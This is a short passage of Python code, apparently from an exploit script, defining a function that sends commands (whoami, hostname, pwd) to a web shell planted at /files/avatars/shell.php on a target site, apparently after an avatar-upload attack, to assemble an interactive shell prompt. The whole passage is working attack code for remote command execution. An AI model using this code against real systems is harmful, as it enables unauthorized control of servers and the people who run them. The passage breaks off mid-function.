...
def get_prompt(url):
	username = requests.get(url=url+"/files/avatars/shell.php?cmd=whoami").text.strip()
	hostname = requests.get(url=url+"/files/avatars/shell.php?cmd=hostname").text.strip()
	working_dir = requests.get(url=url+"/files/avatars/shell.php?cmd=pwd").text.strip()
